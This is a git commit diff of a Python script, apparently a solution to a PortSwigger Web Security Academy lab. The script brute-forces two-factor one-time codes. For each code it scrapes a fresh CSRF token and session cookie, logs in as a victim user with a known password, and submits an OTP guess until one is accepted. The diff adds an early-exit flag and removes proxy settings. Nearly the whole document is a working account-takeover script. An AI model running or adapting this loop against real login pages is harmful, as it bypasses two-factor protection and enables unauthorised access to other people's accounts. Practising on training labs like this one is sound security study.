6a4e8e9830e4475d4ca4a3ba36fbf34cc711d5c2
micheal keines <micheal.jebakeines@cybersecurityworks.com>
2021-02-18 04:45:31 -0500

    commited

--- portswigger/labs/authentication/2fa_flawed_check_brute_csrf.py
+++ portswigger/labs/authentication/2fa_flawed_check_brute_csrf.py
@@ -18,34 +18,39 @@ passwd = "montoya"
 file1 = open('creds/otp_pay','r')
 opts = file1.readlines()
 i = 1
+found = False
 for otp in opts:
+    if found == True:
+        break
+    #print(otp,end="\r",flush=True)
     print("{}".format(i),end="\r",flush=True)
     i = i + 1
-    r1 = requests.get(url+'login',proxies=proxies,verify=False)
+    r1 = requests.get(url+'login',verify=False)
     cookie_value = r1.cookies['session']
     
-    print("Request 1 done",end="\r",flush=True)
+    #print("Request 1 done",end="\r",flush=True)
     csrf = re.search('csrf"\ value="(.*?)">',r1.text).group(1)
     
     headers = {'Cookie': 'session='+cookie_value}
     data = {'csrf':csrf,'username':victim,'password':passwd}
     
-    r2 = requests.post(url+'login',data=data,headers=headers,proxies=proxies,verify=False, allow_redirects=False)
+    r2 = requests.post(url+'login',data=data,headers=headers,verify=False, allow_redirects=False)
 
-    print("Request 2 done",end="\r",flush=True)
+   # print("Request 2 done",end="\r",flush=True)
     if "Invalid username or password." not in r2.text:
         cookie_value = r2.cookies['session']
         headers = {'Cookie': 'session='+cookie_value}
 
-        r3 = requests.get(url+'login2',headers=headers,proxies=proxies,verify=False)
+        r3 = requests.get(url+'login2',headers=headers,verify=False)
         
-        print("Request 3 done",end="\r",flush=True)
+        #print("Request 3 done",end="\r",flush=True)
         #print(r3.text)
         csrf = re.search('csrf"\ value="(.*?)">',r3.text).group(1)
         data = {'csrf': csrf,'mfa-code': str(otp)[:-1]}
-        r4 = requests.post(url+'login2',headers=headers,data=data,proxies=proxies,verify=False,allow_redirects=False)
+        r4 = requests.post(url+'login2',headers=headers,data=data,verify=False,allow_redirects=False)
         if "Incorrect security code" not in r4.text:
             print(r4.cookies)
             print(otp)
+            found = True
     else:
         print("login falied")
